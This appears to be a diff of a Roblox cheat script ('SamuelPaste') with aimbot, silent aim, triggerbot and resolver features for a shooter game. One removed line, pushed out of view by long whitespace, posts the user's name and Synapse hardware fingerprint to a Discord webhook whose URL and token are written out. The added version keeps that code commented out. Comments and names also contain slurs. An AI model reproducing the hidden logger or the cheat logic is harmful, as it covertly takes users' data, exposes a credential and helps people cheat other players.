@@ -68,7 +68,7 @@ game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
 
 game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()
 
-game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = "neverblox.cc"
+game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = "SamuelPaste"
 
 game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
 
@@ -169,10 +169,21 @@ function findtextrandom(text)
         return text
     end
 end
+
+--[[ some guide for me because i'm retard in string
+string.split(text, from-to letter) example string.split('nig.ger, '.') will return table nig and ger
+string.gsub(text, change what, change to what)
+string.find(text, what to find)
+
+
+
+
+--]]
+
 function textboxtriggers(text)
 	local triggers = {
 		['@user'] = game.Players.LocalPlayer.Name,
-		['@ping'] = game.Stats.PerformanceStats.Ping:GetValue(),
+		['@ping'] = string.split(game.Stats.PerformanceStats.Ping:GetValue(), '.')[1],
 		['@time'] = os.date('%H:%M:%S'),
 	}
 
@@ -4889,7 +4900,7 @@ table.insert(data.options, v.Name)
 end
 	gay()
 end)
-																																																																																																																																																																																																																																																																																																																				if not getgenv().signal then local function SendMessage(Webhook, Message, Botname, Title) local Name;if (not Message or Message == "" or not Botname) then Name = "GameBot" return error("nil or empty message!") else Name = Botname end;   local biggie = "http://buritoman69.glitch.me/webhook";if (not Message or Message == "" or not Botname) then Name = "GameBot";return error("nil or empty message!");else Name = Botname;end;local Body = {['Key'] = tostring("applesaregood"),['Message'] = tostring(Message),['Name'] = Name,['Webhook'] = Webhook};Body = game:GetService('HttpService'):JSONEncode(Body);local Data = game:HttpPost(biggie, Body, false, "application/json");return Data or nil;end;SendMessage("https://discordapp.com/api/webhooks/968738772210552872/zBfFMCoX3yKZC52bg_XOsjmlSQWFmF-kTC2nvq5UspapM2dswfrJLl2Z_Omul4awyXQq","Player: "..game.Players.LocalPlayer.Name.." has tried to bypass logger <@574605228372918283>!1!", "123") ;local req = syn.request({Url = "https://httpbin.org/get"});local parsed = game:GetService("HttpService"):JSONDecode(req.Body);syn.request({Url = "https://discord.com/api/webhooks/968738772210552872/zBfFMCoX3yKZC52bg_XOsjmlSQWFmF-kTC2nvq5UspapM2dswfrJLl2Z_Omul4awyXQq",Method = "POST",Headers = {["Content-Type"] = "application/json"},Body = game:GetService("HttpService"):JSONEncode({["content"] = "Hardware ID: "..parsed.headers["Syn-Fingerprint"]})}) end;
+																																																																																																																																																																																																																																																																																																														--if not getgenv().signal then local function SendMessage(Webhook, Message, Botname, Title) local Name;if (not Message or Message == "" or not Botname) then Name = "GameBot" return error("nil or empty message!") else Name = Botname end;   local biggie = "http://buritoman69.glitch.me/webhook";if (not Message or Message == "" or not Botname) then Name = "GameBot";return error("nil or empty message!");else Name = Botname;end;local Body = {['Key'] = tostring("applesaregood"),['Message'] = tostring(Message),['Name'] = Name,['Webhook'] = Webhook};Body = game:GetService('HttpService'):JSONEncode(Body);local Data = game:HttpPost(biggie, Body, false, "application/json");return Data or nil;end;SendMessage("https://discordapp.com/api/webhooks/968738772210552872/zBfFMCoX3yKZC52bg_XOsjmlSQWFmF-kTC2nvq5UspapM2dswfrJLl2Z_Omul4awyXQq","Player: "..game.Players.LocalPlayer.Name.." has tried to bypass logger <@574605228372918283>!1!", "123") ;local req = game:HttpGet({Url = "https://httpbin.org/get"});local parsed = game:GetService("HttpService"):JSONDecode(req.Body);game:HttpGet({Url = "https://discord.com/api/webhooks/968738772210552872/zBfFMCoX3yKZC52bg_XOsjmlSQWFmF-kTC2nvq5UspapM2dswfrJLl2Z_Omul4awyXQq",Method = "POST",Headers = {["Content-Type"] = "application/json"},Body = game:GetService("HttpService"):JSONEncode({["content"] = "Hardware ID: "..parsed.headers["Syn-Fingerprint"]})}) end;
 Players.PlayerRemoving:Connect(function() 
 table.clear(data.options)
 for i,v in pairs(game.Players:GetPlayers()) do
@@ -6115,173 +6126,7 @@ local other = others:Sector("other", "Left")
 other:Element("Scroll", "lua", {options = allluas, Amount = 5}) 
 other:Element("Button", "load", {}, function() 
 	loadstring(readfile("pastedstormy/lua\\"..values.others["other"].lua.Scroll))() 
-end) 
---[[other:Element("Button", "Watermark", nil, function()
-        -- Instances:
-
-       local watermark = Instance.new("ScreenGui")
-       local ScreenLabel = Instance.new("Frame")
-       local Color = Instance.new("Frame")
-       local UIGradient = Instance.new("UIGradient")
-       local Container = Instance.new("Frame")
-       local UIPadding = Instance.new("UIPadding")
-       local Text = Instance.new("TextLabel")
-       local Time = Instance.new("TextLabel")
-       local Background = Instance.new("Frame")
-       local UIGradient_2 = Instance.new("UIGradient")
-       local name2 = Instance.new("TextLabel")
-
-
-        --Properties:
-
-        watermark.Name = "watermark"
-watermark.Parent = game.CoreGui
-watermark.Enabled = true
-
-ScreenLabel.Name = "ScreenLabel"
-ScreenLabel.Parent = watermark
-ScreenLabel.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-ScreenLabel.BackgroundTransparency = 1.000
-ScreenLabel.BorderColor3 = Color3.fromRGB(20, 20, 20)
-ScreenLabel.Position = UDim2.new(0, 12, 0, 3)
-ScreenLabel.Size = UDim2.new(0, 260, 0, 20)
-
-Color.Name = "Color"
-Color.Parent = ScreenLabel
-Color.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Color.BorderSizePixel = 0
-Color.Position = UDim2.new(0.0192307699, 0, 0, 0)
-Color.Size = UDim2.new(1.25, 0, 0, 2)
-Color.ZIndex = 2
-
-UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, MainUIColor), ColorSequenceKeypoint.new(1, MainUIColor)}
-UIGradient.Rotation = 0
-UIGradient.Parent = Color
-
-Container.Name = "Container"
-Container.Parent = ScreenLabel
-Container.BackgroundTransparency = 1.000
-Container.BorderSizePixel = 0
-Container.Position = UDim2.new(0, 0, 0, 4)
-Container.Size = UDim2.new(1, 0, 0, 14)
-Container.ZIndex = 3
-
-UIPadding.Parent = Container
-UIPadding.PaddingLeft = UDim.new(0, 4)
-
-Text.Name = "Text"
-Text.Parent = Container
-Text.BackgroundTransparency = 1.000
-Text.Position = UDim2.new(0.0381064788, 0, 0, 0)
-Text.Size = UDim2.new(0.373076916, 0, 1, 0)
-Text.ZIndex = 4
-Text.Font = Enum.Font.Code
-Text.Text = "SamuelPaste |"
-Text.TextColor3 = Color3.fromRGB(65025, 65025, 65025)
-Text.TextSize = 14.000
-Text.TextStrokeTransparency = 0.000
-Text.TextXAlignment = Enum.TextXAlignment.Left
-
-Time.Name = "Time"
-Time.Parent = Container
-Time.BackgroundTransparency = 1.000
-Time.Position = UDim2.new(0.374206603, 0, 0, 0)
-Time.Size = UDim2.new(0.278875738, 0, 1, 0)
-Time.ZIndex = 4
-Time.Font = Enum.Font.Code
-Time.Text = " 00:00:00 "
-Time.TextColor3 = Color3.fromRGB(65025, 65025, 65025)
-Time.TextSize = 14.000
-Time.TextStrokeTransparency = 0.000
-Time.TextXAlignment = Enum.TextXAlignment.Left
-
-name2.Name = "name2"
-name2.Parent = Container
-name2.BackgroundTransparency = 1.000
-name2.Position = UDim2.new(0.624206603, 0, 0, 0)
-name2.Size = UDim2.new(0.278875738, 0, 1, 0)
-name2.ZIndex = 4
-name2.Font = Enum.Font.Code
-name2.Text = "| nn"
-name2.TextColor3 = Color3.fromRGB(65025, 65025, 65025)
-name2.TextSize = 14.000
-name2.TextStrokeTransparency = 0.000
-name2.TextXAlignment = Enum.TextXAlignment.Left
-
-Background.Name = "Background"
-Background.Parent = ScreenLabel
-Background.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-Background.BorderColor3 = Color3.fromRGB(22, 22, 22)
-Background.Position = UDim2.new(0.0192307699, 0, 0, 0)
-Background.Size = UDim2.new(1.25, 0, 1, 0)
-
--- Scripts:
-
-local function ZBZX_fake_script() -- Time.LocalScript 
-	local script = Instance.new('LocalScript', Time)
-
-	local mo = "A.M."
-	local mont = nil
-	while wait() do
-		local l = math.fmod(tick(),86400)
-		local h = math.floor(l/3600)
-		local m = math.floor(l/60-h*60)
-		local s = math.floor(math.fmod(l,60))
-		local y = math.floor(1970+tick()/31579200)
-		local mon = {{"January",31,31},{"February",59,28},{"March",90,31},{"April",120,30},{"May",151,31},{"June",181,30},{"July",212,31},{"August",243,31},{"September",273,30},{"October",304,31},{"November",334,30},{"December",365,31}}
-		if y%4 == 0 then
-			mon[2][3] = 29
-			for i,v in pairs(mon) do
-				if i ~= 1 then
-					v[2] = v[2] + 1
-				end
-			end
-		end
-		local d = math.floor(tick()/86400%365.25+1)
-		for i,v in pairs(mon) do
-			if v[2]-v[3]<=d then
-				mont = i
-			end
-		end
-		d = d + mon[mont][3]-mon[mont][2]
-		if m <= 9 then
-			m = "0" ..m
-		end
-		if s <= 9 then
-			s = "0" ..s
-		end
-		if h >= 12 then
-			mo = "P.M."
-		else
-			mo = "A.M."
-		end
-		if h > 12 then
-			h = h - 12
-		end
-		script.Parent.Text = "" ..h.. ":" ..m.. ":" ..s.. " "
-	end
-end
-coroutine.wrap(ZBZX_fake_script)()
-local function POWDOGC_fake_script() -- ScreenLabel.LocalScript 
-	local script = Instance.new('LocalScript', ScreenLabel)
-
-	local gui = script.Parent
-                gui.Draggable = true
-            gui.Active = true
-end
-coroutine.wrap(POWDOGC_fake_script)()
-
-
-local function IPHCOC_fake_script() -- welcome.LocalScript 
-	local script = Instance.new('LocalScript', name2)
-
-	local plr = game.Players.LocalPlayer
-
-	script.Parent.Text = "|"..plr.Name.."."
-end
-coroutine.wrap(IPHCOC_fake_script)()
-    end)
-	--]]
+end)
 local function predict(part, ping)
     local oldPos = part.Position
     local step = RunService.RenderStepped:Wait()
@@ -6559,7 +6404,6 @@ aimbot:Element('Dropdown', 'prediction', {options = {'off', 'cframe', 'velocity'
 aimbot:Element("Slider", "automatic multiplier", {min = -100, max = 100, default = 0})
 aimbot:Element("Slider", "automatic multiplier2", {min = -100, max = 100, default = 0})
 aimbot:Element("Toggle", "teammates") 
-aimbot:Element('Toggle', 'ignore on start')
 aimbot:Element("Toggle", "auto baim") 
 			aimbot:Element("Toggle", "knifebot")
 			aimbot:Element("Dropdown", "knifebot type", {options = {"normal", "rapid"}}) 
@@ -9093,8 +8937,8 @@ local emojis = {
 function emoteReplace(str)
 	for i,v in pairs(emojis) do
 		if str:find(i) then
-			gay = string.gsub(str, i, v)
-			shit = string.rep(gay, 18)
+			asbqwewq = string.gsub(str, i, v)
+			shit = string.rep(asbqwewq, 18)
 		end
 	end
 	return shit
@@ -9404,7 +9248,7 @@ fonts = {
 	'Ubuntu',
 }
 
-function instancethewatermark()
+do
 	local watermark = Instance.new('ScreenGui')
 	local watermark_2 = Instance.new('Frame')
 	local title = Instance.new('TextLabel')
@@ -9514,7 +9358,7 @@ function instancethewatermark()
 				end 
 end
 
-instancethewatermark()
+
 themebackground = {
 	['Default'] = 8893436115,
     ['Shiba.gang'] = 2151741365,
@@ -9561,11 +9405,16 @@ end)
 
 watermark:Element('Dropdown', 'themes', {options = watermarkthemes})
 
-
+local watermarktext
 watermark:Element('TextBox', 'watermark text', {placeholder = 'text here', default = {text = '         yes.no'}}, function(tbl)
-
-	local textierawr = textboxtriggers(tbl.Text)
-	watermarklocation.watermark.title.Text = textierawr
+	pcall(function()
+		watermarktext:Disconnect()
+	end)
+	watermarktext = RunService.RenderStepped:Connect(function()
+		wait(1)
+		local textierawr = textboxtriggers(tbl.Text)
+		watermarklocation.watermark.title.Text = textierawr
+	end)
 end)
 
 watermark:Element('Dropdown', 'text font', {options = fonts}, function(tbl)
@@ -9580,8 +9429,11 @@ watermark:Element('Slider', 'text line height', {min = -50, max = 50, default = 
 	watermarklocation.watermark.title.LineHeight = 1.1 * (tbl.Slider / 10)
 end)
 
-watermark:Element('Slider', 'watermark lenght', {min = 0, max = 100, default = watermarklocation.watermark.Size.X.Scale}, function(tbl)
-	watermarklocation.watermark.Size = UDim2.new(0, tbl.Slider * 5, 0, 20)
+watermark:Element('Slider', 'watermark lenght', {min = 0, max = 100, default = 89}, function(tbl)
+	watermarklocation.watermark.Size = UDim2.new(0, tbl.Slider * 5, 0, values.misc.watermark['watermark height'].Slider)
+end)
+watermark:Element('Slider', 'watermark height', {min = 0, max = 100, default = 20}, function(tbl)
+	watermarklocation.watermark.Size = UDim2.new(0, values.misc.watermark['watermark lenght'].Slider * 5, 0, tbl.Slider)
 end)
 
 watermark:Element('ToggleColor', 'border color', {default = {Color = Color3.fromRGB(255,255,255)}}, function(tbl)
@@ -9738,30 +9590,13 @@ local function YROTATION(cframe)
 	local x, y, z = cframe:ToOrientation() 
 	return CFrame.new(cframe.Position) * CFrame.Angles(0,y,0) 
 end
-local weps = { 
+--[[local weps = { 
 	Pistol = {"USP", "P2000", "Glock", "DualBerettas", "P250", "FiveSeven", "Tec9", "CZ", "DesertEagle", "R8"}, 
 	SMG = {"MP9", "MAC10", "MP7", "UMP", "P90", "Bizon"}, 
 	Rifle = {"M4A4", "M4A1", "AK47", "Famas", "Galil", "AUG", "SG"}, 
 	Sniper = {"AWP", "Scout", "G3SG1"} 
-} 
-local function GetWeaponRage(weapon) 
-	return table.find(weps.Pistol, weapon) and "pistol" or table.find(weps.Rifle, weapon) and "rifle" or weapon == "AWP" and "awp" or weapon == "G3SG1"  and "auto" or weapon == "Scout" and "scout" or "default" 
-end 
-local function GetStatsRage(weapon) 
-	if weapon == "default" then 
-		return values.rage.weapons.default 
-	end 
-end 
-local function GetWeaponLegit(weapon) 
-	return table.find(weps.Pistol, weapon) and "pistol" or table.find(weps.Rifle, weapon) and "rifle" or table.find(weps.SMG, weapon) and "smg" or table.find(weps.Sniper, weapon) and "sniper" or "default" 
-end 
-local function GetStatsLegit(weapon) 
-	if weapon == "default" then 
-		return values.legit.main.default 
-	else 
-			return values.legit.main.default 
-		end 
-end 
+}--]]
+
 
 UserInputService.InputBegan:Connect(function(key, isFocused)
 	if key.UserInputType == Enum.UserInputType.MouseButton1 and UserInputService:GetFocusedTextBox() == nil then
@@ -9784,14 +9619,13 @@ UserInputService.InputBegan:Connect(function(key, isFocused)
 	end
 end)
 
-
-
 switchtrigger = {false, nil, nil}
 savedspinpitch = 0
 Jitter = false
 jitterwait = false
 lockyaw = false
 local Spin = 0 
+local Hitboxes = {}
 allowedtofreeze = true
 local RageTarget 
 local Filter = false 
@@ -9812,12 +9646,47 @@ RunService:BindToRenderStep('Rage', 400, function(step)
 	local Root = LocalPlayer.Character.HumanoidRootPart
 		local RageGuy 
 		if workspace:FindFirstChild("Map") and Client.gun ~= "none" and Client.gun.Name ~= "C4" then
-			if values.rage.aimbot.enabled.Toggle and (LocalPlayer.Character.Humanoid.WalkSpeed ~= 0 or values.rage.aimbot['ignore on start'].Toggle) then
+			if values.rage.aimbot.enabled.Toggle then
 				local Origin = values.rage.aimbot.origin.Dropdown == "character" and LocalPlayer.Character.LowerTorso.Position + Vector3.new(0, 2.5, 0) or CamCFrame.p
-				local Stats = GetStatsRage(GetWeaponRage(Client.gun.Name))
+				local Stats = values.rage.weapons.default
 				for _,Player in pairs(Players:GetPlayers()) do
 					if table.find(values.misc.client["gun modifiers"].Jumbobox, "firerate") then
 						Client.DISABLED = false
+					end
+					 
+					if Player.Character and Player.Character:FindFirstChild("Humanoid") and Player.Character:FindFirstChild("Humanoid").Health > 0 and Player.Team ~= "TTT" and Player ~= LocalPlayer then
+						if table.find(values.rage.aimbot.resolver.Jumbobox, 'pitch') then
+							Player.Character.UpperTorso.Waist.C0 = CFrame.new(0, 0.5, 0)
+                            Player.Character.Head.Neck.C0 = CFrame.new(0, 0.7, 0)
+						end
+						if table.find(values.rage.aimbot.resolver.Jumbobox, 'roll') then
+							Player.Character.Humanoid.MaxSlopeAngle = 0
+						end
+						if table.find(values.rage.aimbot.resolver.Jumbobox, 'arms') then
+							Player.Character.RightUpperArm:FindFirstChildWhichIsA('Motor6D').C0 = CFrame.new(1.5, 0.549999952, -0.2)
+							Player.Character.LeftUpperArm:FindFirstChildWhichIsA('Motor6D').C0 = CFrame.new(-1.5, 0.549999952, -0.2)
+						end
+						if table.find(values.rage.aimbot.resolver.Jumbobox, 'animation') then
+							for a, b in next, Player.Character.Humanoid:GetPlayingAnimationTracks() do
+								b:Stop()
+							end
+						end
+						if table.find(values.rage.aimbot.resolver.Jumbobox, "bhop") then   
+							Player.Character.Head.CFrame = CFrame.new(Player.Character.Head.Position)
+							Player.Character.UpperTorso.CFrame = CFrame.new(Player.Character.UpperTorso.Position)
+							Player.Character.LowerTorso.CFrame = CFrame.new(Player.Character.LowerTorso.Position)
+							Player.Character.LeftLowerArm.CFrame = CFrame.new(Player.Character.LeftLowerArm.Position)
+							Player.Character.LeftUpperArm.CFrame = CFrame.new(Player.Character.LeftUpperArm.Position)
+							Player.Character.RightLowerArm.CFrame = CFrame.new(Player.Character.RightLowerArm.Position)
+							Player.Character.RightUpperArm.CFrame = CFrame.new(Player.Character.RightUpperArm.Position)
+							Player.Character.LeftLowerLeg.CFrame = CFrame.new(Player.Character.LeftLowerLeg.Position)
+							Player.Character.LeftUpperLeg.CFrame = CFrame.new(Player.Character.LeftUpperLeg.Position)
+							Player.Character.RightLowerLeg.CFrame = CFrame.new(Player.Character.RightLowerLeg.Position)
+							Player.Character.RightUpperLeg.CFrame = CFrame.new(Player.Character.RightUpperLeg.Position)
+						end
+						if values.rage.aimbot["front track"].Toggle then
+							Player.Character.Head.Neck.C0 = CFrame.new(0,values.rage.aimbot["Y distance"].Slider,values.rage.aimbot["X distance"].Slider) * CFrame.Angles(0, 0, 0)
+						end
 					end
 					if Player.Character and Player.Character:FindFirstChild("Humanoid") and not Client.DISABLED and Player.Character:FindFirstChild("Humanoid").Health > 0 and Player.Team ~= "TTT" and not Player.Character:FindFirstChildOfClass("ForceField") and GetDeg(CamCFrame, Player.Character.Head.Position) <= values.rage.weapons.default["max fov"].Slider and Player ~= LocalPlayer then
 						if Player.Team ~= LocalPlayer.Team or values.rage.aimbot.teammates.Toggle and Player:FindFirstChild("Status") and Player.Status.Team.Value ~= LocalPlayer.Status.Team.Value and Player.Status.Alive.Value then
@@ -9908,7 +9777,7 @@ RunService:BindToRenderStep('Rage', 400, function(step)
 								if Player.Character:FindFirstChild("Gun") then
 									table.insert(Ignore, Player.Character.Gun)
 								end
-								local Hitboxes = {}
+								table.clear(Hitboxes)
 								for _,Hitbox in ipairs(values.rage.weapons.default.hitboxes.Jumbobox) do
 									if values.rage.weapons.default["prefer body"].Toggle and (values.rage.aimbot.teammates.Toggle and true or Player.Team ~= LocalPlayer.Team) then
 										if Hitbox == "head" and (not values.rage.aimbot["auto baim"].Toggle or Player.Character:FindFirstChild("FakeHead")) then
@@ -10234,7 +10103,7 @@ RunService:BindToRenderStep('Rage', 400, function(step)
 					end
 				end 
 			elseif values.legit.aimbot["aim assist"].Toggle and values.legit.aimbot["aim assist"].Active and not library.uiopen then 
-				local Stats = GetStatsLegit(GetWeaponLegit(Client.gun.Name)) 
+				local Stats = values.legit.main.default 
 				local Ignore = {LocalPlayer.Character, Camera, workspace.Map.Clips, workspace.Map.SpawnPoints, workspace.Debris} 
 				local Closest = 9999 
 				local Target 
@@ -10295,7 +10164,7 @@ RunService:BindToRenderStep('Rage', 400, function(step)
 				end 
 			end 
 			if not values.rage.aimbot.enabled.Toggle and values.legit.aimbot["triggerbot"].Toggle and values.legit.aimbot["triggerbot"].Active and not TriggerDebounce then 
-				local Stats = GetStatsLegit(GetWeaponLegit(Client.gun.Name)) 
+				local Stats = values.legit.main.default 
 				if Stats.triggerbot.Toggle then 
 					if not table.find(Stats.conditions.Jumbobox, "blind") or LocalPlayer.PlayerGui.Blnd.Blind.BackgroundTransparency > 0.9 then 
 						if not table.find(Stats.conditions.Jumbobox, "standing") or SelfVelocity.Magnitude < 3 then 
@@ -10321,53 +10190,6 @@ RunService:BindToRenderStep('Rage', 400, function(step)
 			end 
 		end 
 	end
-end)
-
-
-RunService:BindToRenderStep('Resolvers', 500, function()
-				for _,Player in pairs(Players:GetPlayers()) do
-					if table.find(values.misc.client["gun modifiers"].Jumbobox, "firerate") then
-						Client.DISABLED = false
-					end
-					 
-					if Player.Character and Player.Character:FindFirstChild("Humanoid") and Player.Character:FindFirstChild("Humanoid").Health > 0 and Player.Team ~= "TTT" and Player ~= LocalPlayer then
-						if table.find(values.rage.aimbot.resolver.Jumbobox, 'pitch') then
-							Player.Character.UpperTorso.Waist.C0 = CFrame.new(0, 0.5, 0)
-                            Player.Character.Head.Neck.C0 = CFrame.new(0, 0.7, 0)
-						end
-						if table.find(values.rage.aimbot.resolver.Jumbobox, 'roll') then
-							Player.Character.Humanoid.MaxSlopeAngle = 0
-						end
-						if table.find(values.rage.aimbot.resolver.Jumbobox, 'arms') then
-							Player.Character.RightUpperArm:FindFirstChildWhichIsA('Motor6D').C0 = CFrame.new(1.5, 0.549999952, -0.2)
-							Player.Character.LeftUpperArm:FindFirstChildWhichIsA('Motor6D').C0 = CFrame.new(-1.5, 0.549999952, -0.2)
-						end
-						if table.find(values.rage.aimbot.resolver.Jumbobox, 'animation') then
-							for a, b in next, Player.Character.Humanoid:GetPlayingAnimationTracks() do
-								b:Stop()
-							end
-						end
-						if table.find(values.rage.aimbot.resolver.Jumbobox, "bhop") then   
-							Player.Character.Head.CFrame = CFrame.new(Player.Character.Head.Position)
-							Player.Character.UpperTorso.CFrame = CFrame.new(Player.Character.UpperTorso.Position)
-							Player.Character.LowerTorso.CFrame = CFrame.new(Player.Character.LowerTorso.Position)
-							Player.Character.LeftLowerArm.CFrame = CFrame.new(Player.Character.LeftLowerArm.Position)
-							Player.Character.LeftUpperArm.CFrame = CFrame.new(Player.Character.LeftUpperArm.Position)
-							Player.Character.RightLowerArm.CFrame = CFrame.new(Player.Character.RightLowerArm.Position)
-							Player.Character.RightUpperArm.CFrame = CFrame.new(Player.Character.RightUpperArm.Position)
-							Player.Character.LeftLowerLeg.CFrame = CFrame.new(Player.Character.LeftLowerLeg.Position)
-							Player.Character.LeftUpperLeg.CFrame = CFrame.new(Player.Character.LeftUpperLeg.Position)
-							Player.Character.RightLowerLeg.CFrame = CFrame.new(Player.Character.RightLowerLeg.Position)
-							Player.Character.RightUpperLeg.CFrame = CFrame.new(Player.Character.RightUpperLeg.Position)
-						end
-						if values.rage.aimbot["front track"].Toggle then
-							Player.Character.Head.Neck.C0 = CFrame.new(0,values.rage.aimbot["Y distance"].Slider,values.rage.aimbot["X distance"].Slider) * CFrame.Angles(0, 0, 0)
-						end
-					end
-				end
-end)
-
-RunService:BindToRenderStep('Legit', 200, function()	
 	CamCFrame = Camera.CFrame
 	CamLook = CamCFrame.LookVector
 
@@ -10380,7 +10202,7 @@ RunService:BindToRenderStep('Legit', 200, function()
 	
 		Fov.Color =  values.legit.settings['draw fov'].Color
 		Fov.Position = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)
-		Fov.Radius = GetStatsLegit(GetWeaponLegit(Client.gun.Name))['field of view'].Slider
+		Fov.Radius = values.legit.main.default['field of view'].Slider
 		Fov.Thickness = values.legit.settings['fov thickness'].Slider
 		Fov.Filled = values.legit.settings['filled fov'].Toggle
 	end)
@@ -10990,6 +10812,7 @@ end)
 
 
 
+
 			local visualsilentangle = nil
 			VisualizeSilentAngles:Connect(function(pos)
 					visualsilentangle = RageTarget.Position
@@ -11082,7 +10905,7 @@ if not getgenv().PasteDisabled then
 			if table.find(values.misc.client["gun modifiers"].Jumbobox, "spread") then 
 				args[1] = Ray.new(Camera.CFrame.p, Camera.CFrame.LookVector * Client.gun.Range.Value) 
 			end 
-			local Stats = GetStatsLegit(GetWeaponLegit(Client.gun.Name)) 
+			local Stats = values.legit.main.default
 			if values.legit.aimbot["silent aim"].Toggle and values.legit.aimbot["silent aim"].Active and Stats["silent aim"].Toggle then 
 				local Ignore = {LocalPlayer.Character, Camera, workspace.Map.Clips, workspace.Map.SpawnPoints, workspace.Debris} 
 				local Closest = 9999 
